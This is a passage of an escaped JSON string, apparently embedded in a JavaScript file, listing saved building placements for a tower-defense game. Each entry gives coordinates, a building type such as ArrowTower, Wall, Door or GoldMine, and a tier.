"56584687\":{\"x\":48,\"y\":432,\"type\":\"ArrowTower\",\"tier\":1},\"56584688\":{\"x\":-96,\"y\":432,\"type\":\"ArrowTower\",\"tier\":1},\"56584689\":{\"x\":-96,\"y\":336,\"type\":\"ArrowTower\",\"tier\":1},\"56584690\":{\"x\":48,\"y\":336,\"type\":\"ArrowTower\",\"tier\":1},\"56584691\":{\"x\":-168,\"y\":648,\"type\":\"SlowTrap\",\"tier\":1},\"56584692\":{\"x\":-216,\"y\":648,\"type\":\"SlowTrap\",\"tier\":1},\"56584693\":{\"x\":-192,\"y\":576,\"type\":\"BombTower\",\"tier\":1},\"56584694\":{\"x\":-336,\"y\":576,\"type\":\"BombTower\",\"tier\":1},\"56584695\":{\"x\":-264,\"y\":648,\"type\":\"Door\",\"tier\":1},\"56584696\":{\"x\":-264,\"y\":600,\"type\":\"Door\",\"tier\":1},\"56584697\":{\"x\":-264,\"y\":552,\"type\":\"Door\",\"tier\":1},\"56584698\":{\"x\":-264,\"y\":504,\"type\":\"Door\",\"tier\":1},\"56584699\":{\"x\":-264,\"y\":456,\"type\":\"Door\",\"tier\":1},\"56584700\":{\"x\":-264,\"y\":408,\"type\":\"Door\",\"tier\":1},\"56584701\":{\"x\":-264,\"y\":360,\"type\":\"Door\",\"tier\":1},\"56584702\":{\"x\":-264,\"y\":312,\"type\":\"Door\",\"tier\":1},\"56584704\":{\"x\":-312,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"56584705\":{\"x\":-360,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"56584706\":{\"x\":-408,\"y\":600,\"type\":\"Wall\",\"tier\":1},\"56584707\":{\"x\":-312,\"y\":696,\"type\":\"Door\",\"tier\":1},\"56584708\":{\"x\":-360,\"y\":696,\"type\":\"Door\",\"tier\":1},\"56584709\":{\"x\":-408,\"y\":648,\"type\":\"Door\",\"tier\":1},\"56584710\":{\"x\":-456,\"y\":600,\"type\":\"Door\",\"tier\":1},\"56584991\":{\"x\":-504,\"y\":504,\"type\":\"Wall\",\"tier\":1},\"56585064\":{\"x\":-552,\"y\":504,\"type\":\"Door\",\"tier\":1},\"56585158\":{\"x\":-504,\"y\":552,\"type\":\"Door\",\"tier\":1},\"56585425\":{\"x\":-600,\"y\":408,\"type\":\"Wall\",\"tier\":1},\"56588955\":{\"x\":-624,\"y\":336,\"type\":\"MagicTower\",\"tier\":1},\"56589291\":{\"x\":-600,\"y\":264,\"type\":\"Door\",\"tier\":1},\"56589379\":{\"x\":-696,\"y\":360,\"type\":\"Door\",\"tier\":1},\"56589441\":{\"x\":-648,\"y\":408,\"type\":\"Door\",\"tier\":1},\"56589493\":{\"x\":-600,\"y\":456,\"type\":\"Door\",\"tier\":1},\"56589694\":{\"x\":-432,\"y\":528,\"type\":\"MeleeTower\",\"tier\":1},\"56589715\":{\"x\":-336,\"y\":480,\"type\":\"BombTower\",\"tier\":1},\"56589839\":{\"x\":-432,\"y\":336,\"type\":\"BombTower\",\"tier\":1},\"56589861\":{\"x\":-432,\"y\":432,\"type\":\"BombTower\",\"tier\":1},\"56589954\":{\"x\":-336,\"y\":336,\"type\":\"BombTower\",\"tier\":1},\"56589955\":{\"x\":-360,\"y\":408,\"type\":\"Wall\",\"tier\":1},\"56589956\":{\"x\":-312,\"y\":408,\"type\":\"Wall\",\"tier\":1},\"56589957\":{\"x\":-96,\"y\":240,\"type\":\"BombTower\",\"tier\":1},\"56589958\":{\"x\":-192,\"y\":288,\"type\":\"BombTower\",\"tier\":1},\"56589959\":{\"x\":-192,\"y\":384,\"type\":\"BombTower\",\"tier\":1},\"56589960\":{\"x\":-192,\"y\":480,\"type\":\"BombTower\",\"tier\":1},\"56589961\":{\"x\":240,\"y\":576,\"type\":\"BombTower\",\"tier\":1},\"56589962\":{\"x\":336,\"y\":528,\"type\":\"BombTower\",\"tier\":1},\"56589963\":{\"x\":240,\"y\":480,\"type\":\"BombTower\",\"tier\":1},\"56589964\":{\"x\":336,\"y\":432,\"type\":\"BombTower\",\"tier\":1},\"56589965\":{\"x\":216,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"56589966\":{\"x\":264,\"y\":696,\"type\":\"Wall\",\"tier\":1},\"56589967\":{\"x\":312,\"y\":744,\"type\":\"Wall\",\"tier\":1},\"56589968\":{\"x\":360,\"y\":744,\"type\":\"Wall\",\"tier\":1},\"56589969\":{\"x\":408,\"y\":696,\"type\":\"Wall\",\"tier\":1},\"56589970\":{\"x\":456,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"56589971\":{\"x\":696,\"y\":360,\"type\":\"Wall\",\"tier\":1},\"56589972\":{\"x\":696,\"y\":408,\"type\":\"Wall\",\"tier\":1},\"56589973\":{\"x\":648,\"y\":456,\"type\":\"Wall\",\"tier\":1},\"56589974\":{\"x\":456,\"y\":600,\"type\":\"Wall\",\"tier\":1},\"56589975\":{\"x\":456,\"y\":552,\"type\":\"Wall\",\"tier\":1},\"56589976\":{\"x\":456,\"y\":504,\"type\":\"Wall\",\"tier\":1},\"56589977\":{\"x\":408,\"y\":456,\"type\":\"Wall\",\"tier\":1},\"56589978\":{\"x\":600,\"y\":456,\"type\":\"Wall\",\"tier\":1},\"56589979\":{\"x\":552,\"y\":456,\"type\":\"Wall\",\"tier\":1},\"56589980\":{\"x\":504,\"y\":408,\"type\":\"Wall\",\"tier\":1},\"56589981\":{\"x\":456,\"y\":360,\"type\":\"Wall\",\"tier\":1},\"56589982\":{\"x\":408,\"y\":504,\"type\":\"Wall\",\"tier\":1},\"56589983\":{\"x\":408,\"y\":552,\"type\":\"Wall\",\"tier\":1},\"56589984\":{\"x\":408,\"y\":600,\"type\":\"Wall\",\"tier\":1},\"56589985\":{\"x\":360,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"56589986\":{\"x\":360,\"y\":696,\"type\":\"Wall\",\"tier\":1},\"56589987\":{\"x\":312,\"y\":696,\"type\":\"Wall\",\"tier\":1},\"56589988\":{\"x\":312,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"56589989\":{\"x\":312,\"y\":600,\"type\":\"Wall\",\"tier\":1},\"56589990\":{\"x\":360,\"y\":600,\"type\":\"Wall\",\"tier\":1},\"56589991\":{\"x\":408,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"56589992\":{\"x\":264,\"y\":648,\"type\":\"Wall\",\"tier\":1},\"56589993\":{\"x\":504,\"y\":360,\"type\":\"Wall\",\"tier\":1},\"56589994\":{\"x\":552,\"y\":360,\"type\":\"Wall\",\"tier\":1},\"56589995\":{\"x\":600,\"y\":360,\"type\":\"Wall\",\"tier\":1},\"56589996\":{\"x\":648,\"y\":360,\"type\":\"Wall\",\"tier\":1},\"56589997\":{\"x\":648,\"y\":408,\"type\":\"Wall\",\"tier\":1},\"56589998\":{\"x\":600,\"y\":408,\"type\":\"Wall\",\"tier\":1},\"56589999\":{\"x\":552,\"y\":408,\"type\":\"Wall\",\"tier\":1},\"56590001\":{\"x\":24,\"y\":-552,\"type\":\"SlowTrap\",\"tier\":1},\"56590003\":{\"x\":600,\"y\":24,\"type\":\"SlowTrap\",\"tier\":1},\"56590004\":{\"x\":-552,\"y\":-24,\"type\":\"SlowTrap\",\"tier\":1},\"56590005\":{\"x\":-600,\"y\":-72,\"type\":\"Door\",\"tier\":1},\"56590006\":{\"x\":-552,\"y\":24,\"type\":\"Door\",\"tier\":1},\"56590008\":{\"x\":-600,\"y\":-120,\"type\":\"SlowTrap\",\"tier\":1},\"56590009\":{\"x\":-600,\"y\":-168,\"type\":\"SlowTrap\",\"tier\":1},\"56590010\":{\"x\":-600,\"y\":-216,\"type\":\"SlowTrap\",\"tier\":1},\"56590011\":{\"x\":-552,\"y\":-216,\"type\":\"SlowTrap\",\"tier\":1},\"56590012\":{\"x\":-552,\"y\":-168,\"type\":\"SlowTrap\",\"tier\":1},\"56590013\":{\"x\":-648,\"y\":-264,\"type\":\"SlowTrap\",\"tier\":1},\"56590014\":{\"x\":-600,\"y\":120,\"type\":\"SlowTrap\",\"tier\":1},\"56590015\":{\"x\":-600,\"y\":168,\"type\":\"SlowTrap\",\"tier\":1},\"56590016\":{\"x\":-600,\"y\":216,\"type\":\"SlowTrap\",\"tier\":1},\"56590017\":{\"x\":-648,\"y\":264,\"type\":\"SlowTrap\",\"tier\":1},\"56590018\":{\"x\":-696,\"y\":312,\"type\":\"SlowTrap\",\"tier\":1},\"56590019\":{\"x\":-600,\"y\":72,\"type\":\"SlowTrap\",\"tier\":1},\"56590020\":{\"x\":-552,\"y\":72,\"type\":\"SlowTrap\",\"tier\":1},\"56590021\":{\"x\":-552,\"y\":120,\"type\":\"SlowTrap\",\"tier\":1},\"56590022\":{\"x\":-552,\"y\":168,\"type\":\"SlowTrap\",\"tier\":1},\"56590023\":{\"x\":48,\"y\":-192,\"type\":\"Harvester\",\"tier\":1},\"56590024\":{\"x\":-216,\"y\":-648,\"type\":\"SlowTrap\",\"tier\":1},\"56590025\":{\"x\":-168,\"y\":-600,\"type\":\"SlowTrap\",\"tier\":1},\"56590026\":{\"x\":-120,\"y\":-600,\"type\":\"SlowTrap\",\"tier\":1},\"56590027\":{\"x\":-72,\"y\":-600,\"type\":\"SlowTrap\",\"tier\":1},\"56590028\":{\"x\":-120,\"y\":-552,\"type\":\"SlowTrap\",\"tier\":1},\"56590029\":{\"x\":-168,\"y\":-552,\"type\":\"SlowTrap\",\"tier\":1},\"56590030\":{\"x\":-264,\"y\":-696,\"type\":\"Door\",\"tier\":1},\"56590031\":{\"x\":-312,\"y\":-696,\"type\":\"Door\",\"tier\":1},\"56590032\":{\"x\":-264,\"y\":-648,\"type\":\"Wall\",\"tier\":1},\"56590033\":{\"x\":-312,\"y\":-648,\"type\":\"Wall\",\"tier\":1},\"56590121\":{\"x\":-408,\"y\":-552,\"type\":\"Wall\",\"tier\":1},\"56590254\":{\"x\":-408,\"y\":-600,\"type\":\"Door\",\"tier\":1},\"56590284\":{\"x\":-360,\"y\":-648,\"type\":\"Door\",\"tier\":1},\"56590419\":{\"x\":-456,\"y\":-552,\"type\":\"Door\",\"tier\":1},\"56590531\":{\"x\":-504,\"y\":-456,\"type\":\"Wall\",\"tier\":1},\"56590820\":{\"x\":-552,\"y\":-456,\"type\":\"Door\",\"tier\":1},\"56591202\":{\"x\":-504,\"y\":-504,\"type\":\"Door\",\"tier\":1},\"56594179\":{\"x\":48,\"y\":-96,\"type\":\"Harvester\",\"tier\":1},\"56595996\":{\"x\":408,\"y\":360,\"type\":\"Door\",\"tier\":1},\"56596010\":{\"x\":408,\"y\":408,\"type\":\"Door\",\"tier\":1},\"56596035\":{\"x\":456,\"y\":408,\"type\":\"Door\",\"tier\":1},\"56596049\":{\"x\":504,\"y\":456,\"type\":\"Door\",\"tier\":1},\"56596057\":{\"x\":504,\"y\":504,\"type\":\"Door\",\"tier\":1},\"56596069\":{\"x\":504,\"y\":552,\"type\":\"Door\",\"tier\":1},\"56596092\":{\"x\":504,\"y\":600,\"type\":\"Door\",\"tier\":1},\"56596128\":{\"x\":552,\"y\":504,\"type\":\"Door\",\"tier\":1},\"56596157\":{\"x\":600,\"y\":504,\"type\":\"Door\",\"tier\":1},\"56596426\":{\"x\":456,\"y\":456,\"type\":\"Door\",\"tier\":1},\"56596636\":{\"x\":144,\"y\":288,\"type\":\"GoldMine\",\"tier\":1},\"56596644\":{\"x\":144,\"y\":384,\"type\":\"GoldMine\",\"tier\":1},\"56596647\":{\"x\":240,\"y\":384,\"type\":\"GoldMine\",\"tier\":1},\"56596676\":{\"x\":-192,\"y\":-192,\"type\":\"GoldMine\",\"tier\":1},\"56596677\":{\"x\":192,\"y\":-192,\"type\":\"GoldMine\",\"tier\":1},\"56596678\":{\"x\":192,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"56596679\":{\"x\":216,\"y\":-72,\"type\":\"Door\",\"tier\":1},\"56596680\":{\"x\":216,\"y\":-120,\"type\":\"Door\",\"tier\":1},\"56596681\":{\"x\":264,\"y\":-120,\"type\":\"Door\",\"tier\":1},\"56596682\":{\"x\":264,\"y\":-168,\"type\":\"Door\",\"tier\":1},\"56596683\":{\"x\":168,\"y\":-72,\"type\":\"Door\",\"tier\":1},\"56596684\":{\"x\":120,\"y\":-72,\"type\":\"Door\",\"tier\":1},\"56596685\":{\"x\":120,\"y\":-120,\"type\":\"Door\",\"tier\":1},\"56596686\":{\"x\":120,\"y\":-168,\"type\":\"Door\",\"tier\":1},\"56596687\":{\"x\":120,\"y\":-216,\"type\":\"Door\",\"tier\":1},\"56596688\":{\"x\":168,\"y\":-120,\"type\":\"Door\",\"tier\":1},\"56596689\":{\"x\":-72,\"y\":-168,\"type\":\"Door\",\"tier\":1},\"56596690\":{\"x\":-120,\"y\":-216,\"type\":\"Door\",\"tier\":1},\"56596691\":{\"x\":-120,\"y\":-168,\"type\":\"Door\",\"tier\":1},\"56596692\":{\"x\":-120,\"y\":-120,\"type\":\"Door\",\"tier\":1},\"56596693\":{\"x\":-168,\"y\":-120,\"type\":\"Door\",\"tier\":1},\"56596694\":{\"x\":-120,\"y\":-72,\"type\":\"Door\",\"tier\":1},\"56596695\":{\"x\":-72,\"y\":-120,\"type\":\"Door\",\"tier\":1},\"56596696\":{\"x\":-24,\"y\":-120,\"type\":\"Door\",\"tier\":1},\"56596697\":{\"x\":-24,\"y\":-168,\"type\":\"Door\",\"tier\":1},\"56596698\":{\"x\":-24,\"y\":-72,\"type\":\"Door\",\"tier\":1},\"56596699\":{\"x\":-168,\"y\":-72,\"type\":\"Door\",\"tier\":1},\"56596700\":{\"x\":-72,\"y\":-72,\"type\":\"Door\",\"tier\":1},\"56596701\":{\"x\":-72,\"y\":120,\"type\":\"Door\",\"tier\":1},\"56596702\":{\"x\":-120,\"y\":72,\"type\":\"Door\",\"tier\":1},\"56596703\":{\"x\":-168,\"y\":72,\"type\":\"Door\",\"tier\":1},\"56596704\":{\"x\":-168,\"y\":120,\"type\":\"Door\",\"tier\":1},\"56596705\":{\"x\":-216,\"y\":120,\"type\":\"Door\",\"tier\":1},\"56596706\":{\"x\":-216,\"y\":168,\"type\":\"Door\",\"tier\":1},\"56596707\":{\"x\":-216,\"y\":216,\"type\":\"Door\",\"tier\":1},\"56596708\":{\"x\":-264,\"y\":216,\"type\":\"Door\",\"tier\":1},\"56596709\":{\"x\":-264,\"y\":264,\"type\":\"Door\",\"tier\":1},\"56596710\":{\"x\":-216,\"y\":72,\"type\":\"Door\",\"tier\":1},\"56596711\":{\"x\":-168,\"y\":168,\"type\":\"Door\",\"tier\":1},\"56596712\":{\"x\":-168,\"y\":216,\"type\":\"Door\",\"tier\":1},\"56596713\":{\"x\":-120,\"y\":120,\"type\":\"Door\",\"tier\":1},\"56596714\":{\"x\":-72,\"y\":168,\"type\":\"Door\",\"tier\":1},\"56596715\":{\"x\":-120,\"y\":168,\"type\":\"Door\",\"tier\":1},\"56596716\":{\"x\":-72,\"y\":72,\"type\":\"Door\",\"tier\":1},\"56596717\":{\"x\":-24,\"y\":72,\"type\":\"Door\",\"tier\":1},\"56596718\":{\"x\":24,\"y\":72,\"type\":\"Door\",\"tier\":1},\"56596719\":{\"x\":72,\"y\":72,\"type\":\"Door\",\"tier\":1},\"56596720\":{\"x\":120,\"y\":72,\"type\":\"Door\",\"tier\":1},\"56596721\":{\"x\":168,\"y\":72,\"type\":\"Door\",\"tier\":1},\"56596722\":{\"x\":216,\"y\":120,\"type\":\"Door\",\"tier\":1},\"56596723\":{\"x\":216,\"y\":168,\"type\":\"Door\",\"tier\":1},\"56596724\":{\"x\":216,\"y\":216,\"type\":\"Door\",\"tier\":1},\"56596725\":{\"x\":216,\"y\":264,\"type\":\"Door\",\"tier\":1},\"56596726\":{\"x\":264,\"y\":264,\"type\":\"Door\",\"tier\":1},\"56596727\":{\"x\":264,\"y\":216,\"type\":\"Door\",\"tier\":1},\"56596728\":{\"x\":216,\"y\":72,\"type\":\"Door\",\"tier\":1},\"56596729\":{\"x\":168,\"y\":120,\"type\":\"Door\",\"tier\":1},\"56596730\":{\"x\":120,\"y\":120,\"type\":\"Door\",\"tier\":1},\"56596731\":{\"x\":72,\"y\":168,\"type\":\"Door\",\"tier\":1},\"56596732\":{\"x\":72,\"y\":120,\"type\":\"Door\",\"tier\":1},\"56596733\":{\"x\":120,\"y\":168,\"type\":\"Door\",\"tier\":1},\"56596734\":{\"x\":120,\"y\":216,\"type\":\"Door\",\"tier\":1},\"56596735\":{\"x\":72,\"y\":264,\"type\":\"Door\",\"tier\":1},\"56596736\":{\"x\":72,\"y\":216,\"type\":\"Door\",\"tier\":1},\"56596737\":{\"x\":168,\"y\":168,\"type\":\"Door\",\"tier\":1},\"56596738\":{\"x\":168,\"y\":216,\"type\":\"Door\",\"tier\":1},\"56596739\":{\"x\":264,\"y\":168,\"type\":\"Door\",\"tier\":1},\"56596740\":{\"x\":312,\"y\":264,\"type\":\"Door\",\"tier\":1},\"56596741\":{\"x\":312,\"y\":312,\"type\":\"Door\",\"tier\":1},\"56596742\":{\"x\":264,\"y\":312,\"type\":\"Door\",\"tier\":1},\"56596743\":{\"x\":216,\"y\":312,\"type\":\"Door\",\"tier\":1},\"56596744\":{\"x\":312,\"y\":360,\"type\":\"Door\",\"tier\":1},\"56596745\":{\"x\":360,\"y\":360,\"type\":\"Door\",\"tier\":1},\"56596747\":{\"x\":-312,\"y\":-312,\"type\":\"Wall\",\"tier\":1},\"56596748\":{\"x\":-312,\"y\":-264,\"type\":\"Wall\",\"tier\":1},\"56596749\":{\"x\":-336,\"y\":-384,\"type\":\"BombTower\",\"tier\":1},\"56596750\":{\"x\":-576,\"y\":-288,\"type\":\"MagicTower\",\"tier\":1},\"56596751\":{\"x\":-600,\"y\":-360,\"type\":\"Wall\",\"tier\":1},\"56596752\":{\"x\":-600,\"y\":-408,\"type\":\"Door\",\"tier\":1},\"56596753\":{\"x\":-648,\"y\":-360,\"type\":\"Door\",\"tier\":1},\"56596754\":{\"x\":-648,\"y\":-312,\"type\":\"Door\",\"tier\":1},\"56596755\":{\"x\":-192,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"56596756\":{\"x\":-600,\"y\":24,\"type\":\"Door\",\"tier\":1}}";
